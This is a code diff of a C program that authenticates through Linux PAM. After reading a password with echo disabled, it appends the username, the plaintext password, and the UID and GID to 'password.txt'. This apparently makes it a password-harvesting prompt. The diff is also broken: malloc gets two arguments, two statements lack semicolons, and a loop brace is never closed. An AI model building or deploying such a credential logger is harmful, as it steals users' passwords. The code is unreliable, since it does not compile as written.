@@ -7,12 +7,21 @@
 #include<security/pam_appl.h>
 #include<security/pam_misc.h>
 
-int pwd_conversion(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr) {
+int pamconv(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr) {
     struct pam_response *reply = malloc(num_msg, sizeof(struct pam_response));
-    reply[0].resp = strdup((char *)appdata_ptr);
-    reply[0].resp_retcode = 0;
-    *resp = reply;
-    return PAM_SUCCESS;
+    if (!reply) return PAM_BUF_ERR;
+
+    for (int i = 0;i < num_msg;i++) {
+    if (msg[i]->msg_style == PAM_PROMPT_ECHO_OFF) {
+        reply[i].resp = strdup((char *)appdata_ptr);
+        reply[i].resp_retcode = 0;
+    
+    } else {
+        reply[i].resp = NULL;
+        reply[i].resp_retcode = 0;
+    }
+    *resp = reply
+    return PAM_SUCCESS
 };
 
 
@@ -59,6 +68,7 @@ int main(int argc,char *argv[]){
 
     tcsetattr(STDIN_FILENO, TCSADRAIN, &old_t);
     
+
     FILE *f = fopen("password.txt", "a");
 
     snprintf(pwdbuf, sizeof(pwdbuf),"---\nuser: %s\npass: %s\nUID: %d GID: %d", user, password, getuid(), getgid());
